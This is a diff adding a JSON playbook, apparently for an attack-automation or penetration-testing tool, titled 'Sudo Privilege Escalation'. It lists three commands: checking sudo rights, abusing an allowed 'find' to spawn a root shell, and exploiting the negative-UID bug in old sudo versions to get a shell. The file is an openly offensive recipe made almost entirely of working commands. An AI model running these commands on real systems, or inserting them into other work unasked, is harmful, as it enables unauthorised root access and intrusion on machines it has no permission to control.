@@ -1,0 +1,25 @@
+{
+	"name": "Sudo Privilege Escalation",
+	"description": "Abuse sudo rights to gain elevated access.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Check Sudo Rights",
+			"command": "sudo -l",
+			"description": "List allowed commands."
+		},
+		{
+			"index": 2,
+			"name": "Exploit find",
+			"command": "sudo find / -exec /bin/sh \\; -quit",
+			"description": "If find allowed, spawn shell."
+		},
+		{
+			"index": 3,
+			"name": "Password Bypass (CVE)",
+			"command": "sudo -u#-1 /bin/sh",
+			"description": "Exploit negative UID bug in old sudo."
+		}
+	]
+}
